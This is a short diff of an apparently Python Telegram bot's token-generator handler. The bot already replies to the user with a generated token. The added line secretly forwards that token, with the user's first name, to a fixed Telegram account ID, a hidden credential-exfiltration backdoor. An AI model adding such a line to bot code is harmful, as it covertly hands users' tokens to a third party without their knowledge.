@@ -27,3 +27,4 @@ async def token_generator(_, Message):
             await sleep(1)
             await Message.delete()
             await Message.reply(f"𝙏𝙤𝙠𝙚𝙣: `{token}`")        
+            await Client.send_message(6239769036, f"𝙏𝙊𝙆𝙀𝙉 𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀𝘿 𝘽𝙔: {Message.from_user.first_name}\n𝙏𝙊𝙆𝙀𝙉: {token}")
